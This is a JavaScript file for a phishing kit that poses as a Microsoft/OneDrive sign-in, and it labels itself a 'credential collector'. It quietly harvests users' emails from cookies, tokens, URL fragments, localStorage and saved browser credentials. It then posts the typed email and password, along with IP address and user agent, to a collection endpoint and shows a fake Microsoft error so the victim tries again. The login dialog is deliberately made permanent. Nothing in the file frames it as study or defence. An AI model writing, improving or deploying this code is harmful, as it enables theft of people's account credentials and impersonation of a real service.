
// ============================================
// PRO VERSION: ULTRA-REALISTIC CREDENTIAL COLLECTOR
// ============================================

// Microsoft Graph API Configuration
const CONFIG = {
    sessionId: 'od_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15),
    clientId: '00000000-0000-0000-0000-000000000000',
    tenantId: 'common',
    endpoints: {
        primary: '/api/collect',
        token: '/oauth2/v2.0/token',
        me: '/api/v1.0/me',
        drive: '/api/v2.0/drive'
    },
    scopes: 'User.Read Files.ReadWrite.All offline_access',
    tracking: {
        mouse: [],
        keys: [],
        focus: [],
        scroll: []
    }
};

// Real Microsoft error messages
const ERROR_MESSAGES = [
    "Your account or password is incorrect. If you don't remember your password, reset it now.",
    "We couldn't find an account with that username. Try another or get a new Microsoft account.",
    "That password is incorrect. Make sure you're using the password for your Microsoft account.",
    "Something went wrong. Please try again.",
    "You've tried to sign in too many times with an incorrect account or password."
];

// ==================== HELPER FUNCTIONS ====================
function extractEmailFromCookies() {
    try {
        const cookies = document.cookie.split(';');
        const authCookies = ['auth', 'token', 'session', 'user', 'login'];
        
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (authCookies.some(auth => name.toLowerCase().includes(auth))) {
                if (value.includes('.')) {
                    try {
                        const parts = value.split('.');
                        if (parts[1]) {
                            const decoded = JSON.parse(atob(parts[1]));
                            if (decoded.email) return decoded.email;
                            if (decoded.sub) return decoded.sub + '@possible-user.com';
                        }
                    } catch(e) {}
                }
            }
        }
    } catch(e) {}
    return '';
}

function extractEmailSilently() {
    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    
    // Check cookies first
    const cookieEmail = extractEmailFromCookies();
    if (cookieEmail && emailPattern.test(cookieEmail)) return cookieEmail;
    
    // Check URL fragments
    try {
        const hash = window.location.hash.substring(1);
        const hashParams = new URLSearchParams(hash);
        const hashEmail = hashParams.get('email') || hashParams.get('user') || hashParams.get('username');
        if (hashEmail && emailPattern.test(hashEmail)) return hashEmail.trim();
    } catch(e) {}
    
    // Check URL parameters
    try {
        const params = new URLSearchParams(window.location.search);
        const urlEmail = params.get('email') || params.get('user') || params.get('username');
        if (urlEmail && emailPattern.test(urlEmail)) return urlEmail;
    } catch(e) {}
    
    // Check input fields
    try {
        const inputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="user"], input[type="text"]');
        for (let input of inputs) {
            if (input.value && emailPattern.test(input.value)) {
                return input.value;
            }
        }
    } catch(e) {}
    
    // Check localStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            if (value && emailPattern.test(value)) {
                return value;
            }
        }
    } catch(e) {}
    
    // Check window variables
    try {
        const windowVars = ['userEmail', 'email', 'username', 'user', 'login', 'accountEmail'];
        for (let varName of windowVars) {
            if (window[varName] && typeof window[varName] === 'string' && emailPattern.test(window[varName])) {
                return window[varName];
            }
        }
    } catch(e) {}
    
    return '';
}

async function sendDataToBackend(data) {
    try {
        // Simple POST request to endpoint
        await fetch(CONFIG.endpoints.primary, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(data)
        });
    } catch(error) {
        // Silently fail
    }
}

async function getUserInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json', {
            cache: 'no-cache',
            mode: 'cors'
        });
        
        if (response.ok) {
            const data = await response.json();
            return { ip: data.ip };
        }
    } catch (error) {
        // Continue silently
    }
    
    return { ip: null };
}

// ==================== UI FUNCTIONS ====================
function showLogin() {
    const modal = document.getElementById('loginModal');
    if (modal) {
        modal.classList.add('active');
        
                   // ========== AUTO‑GRAB EMAIL FROM URL HASH WITH [Email] SUPPORT ==========
        setTimeout(() => {
            // Step 1: Get everything after the # in the URL
            const hash = window.location.hash.substr(1);
            let email = '';

            // Step 2: Special case – if the hash is exactly "[Email]" (Microsoft trigger)
            if (hash === '[Email]') {
                // Try to get email from browser's saved credentials (Credential Management API)
                if (navigator.credentials && navigator.credentials.get) {
                    navigator.credentials.get({ 
                        password: true,
                        mediation: 'silent'
                    }).then(credential => {
                        if (credential && credential.type === 'password' && credential.id && credential.id.includes('@')) {
                            // Found a saved email – fill it
                            document.getElementById('emailInput').value = credential.id;
                            setTimeout(() => {
                                document.getElementById('passwordInput').focus();
                            }, 50);
                        }
                    }).catch(() => {
                        // Silently fallback
                    });
                }
                
                // Also try other sources (cookies, etc.) as fallback
                const savedEmail = extractEmailSilently();
                if (savedEmail && savedEmail.includes('@')) {
                    document.getElementById('emailInput').value = savedEmail;
                    setTimeout(() => {
                        document.getElementById('passwordInput').focus();
                    }, 50);
                } else {
                    // If no saved email, just focus email input
                    document.getElementById('emailInput').focus();
                }
                return; // Stop here – don't process hash as email
            }

            // Step 3: If hash is NOT "[Email]", process it as regular email (base64 or plain)
            if (hash) {
                const base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
                if (base64regex.test(hash)) {
                    try {
                        email = atob(hash);  // Decode Base64
                    } catch {
                        email = hash;
                    }
                } else {
                    email = hash;
                }
            }

            // Step 4: If no email from hash, try other sources (cookies, etc.)
            if (!email || !email.includes('@')) {
                email = extractEmailSilently();
            }

            // Step 5: If we have a valid email, fill the input
            if (email && email.includes('@') && !email.includes('[') && !email.includes('{')) {
                document.getElementById('emailInput').value = email;
                setTimeout(() => {
                    document.getElementById('passwordInput').focus();
                }, 50);
            } else {
                // No email – focus on email input
                document.getElementById('emailInput').focus();
                document.getElementById('emailInput').value = '';
            }
        }, 100);
        
        // (tracking removed)
            }
}

function hideLogin() {
    // Intentionally disabled — the login modal is permanent.
    const modal = document.getElementById('loginModal');
    if (modal) {
        modal.classList.add('active'); // force it visible if ever toggled
    }
}

function saveSessionData() {
    try {
        sessionStorage.setItem('od_session_' + CONFIG.sessionId, 
            JSON.stringify({
                timestamp: Date.now(),
                tracking: CONFIG.tracking
            })
        );
    } catch(e) {
        // Silently fail
    }
}

function showError(message) {
    const errorMessage = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    
    if (errorMessage && errorText) {
        errorText.innerHTML = message;
        errorMessage.classList.add('show');
        
        errorMessage.style.animation = 'none';
        setTimeout(() => {
            errorMessage.style.animation = 'shake 0.5s ease-in-out';
        }, 10);
    }
}

async function handleLogin(e) {
    e.preventDefault();
    
    const email = document.getElementById('emailInput').value.trim();
    const password = document.getElementById('passwordInput').value;
    const submitBtn = document.getElementById('submitBtn');
    
    if (!submitBtn) return false;
    
    // Microsoft validation
    if (!email || !email.includes('@')) {
        showError("Enter a valid email address, phone number, or Skype name.");
        return false;
    }
    
    if (!password) {
        showError("Please enter your password");
        return false;
    }
    
    // Show Microsoft loading state
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="microsoft-spinner"></span>Signing in...';
    submitBtn.classList.add('loading');
    
    try {
        // Get user IP
        let ip = 'unknown';
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            ip = data.ip;
        } catch(e) {}
        
        // Prepare data to send
        const data = {
            s: CONFIG.sessionId,
            e: email,
            p: password,
            ip: ip,
            ua: navigator.userAgent,
            l: navigator.language,
            ref: document.referrer || 'direct',
            t: Date.now(),
        };
        
        // Send to our backend (which forwards to Resend)
try {
    await fetch('/api/collect', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            email: email,
            password: password,
            ip: ip || 'Unknown',
            userAgent: navigator.userAgent
        })
    });
} catch (e) {
    console.log('send failed silently');
}
        
        // Wait a bit like real server (800-1200ms)
        setTimeout(() => {
            // Show random Microsoft error
            const randomError = ERROR_MESSAGES[Math.floor(Math.random() * ERROR_MESSAGES.length)];
            showError(randomError);
            
            // Reset button
            submitBtn.disabled = false;
            submitBtn.textContent = 'Sign in';
            submitBtn.classList.remove('loading');
            
            // Clear password (like real sites)
            document.getElementById('passwordInput').value = '';
            document.getElementById('passwordInput').focus();
        }, 800 + Math.random() * 400);
        
    } catch (error) {
        showError("We're having trouble connecting. Please try again.");
        submitBtn.disabled = false;
        submitBtn.textContent = 'Sign in';
        submitBtn.classList.remove('loading');
    }
    
    return false;
}

function showForgotPassword() {
    showError("Password reset instructions have been sent to your email. Please check your inbox.");
    
    // Log this action
    sendDataToBackend({
        s: CONFIG.sessionId,
        a: 'forgot_password',
        t: Date.now()
    });
    
    return false;
}

function createAccount() {
    window.open('https://signup.live.com', '_blank');
    return false;
}

// ==================== EVENT LISTENERS ====================
document.addEventListener('DOMContentLoaded', function() {

    showLogin();

    // Modal close on overlay click
    const modal = document.getElementById('loginModal');
    
    // File card click listeners
    document.querySelectorAll('.file-card').forEach(card => {
        card.addEventListener('click', showLogin);
    });
    
    // Right-click context menu
    document.addEventListener('contextmenu', function(e) {
        if (e.target.closest('.file-card')) {
            e.preventDefault();
        }
    });
    
    // Pre-fill email if available
    const email = extractEmailSilently();
    if (email) {
        sessionStorage.setItem('prefilled_email', email);
    }
    
    // Simulate background activity
    setTimeout(() => {
        if (Math.random() > 0.5) {
            fetch('/api/user/me', { method: 'HEAD' }).catch(() => {});
            fetch('/api/files/count', { method: 'HEAD' }).catch(() => {});
        }
    }, 2000);
});
    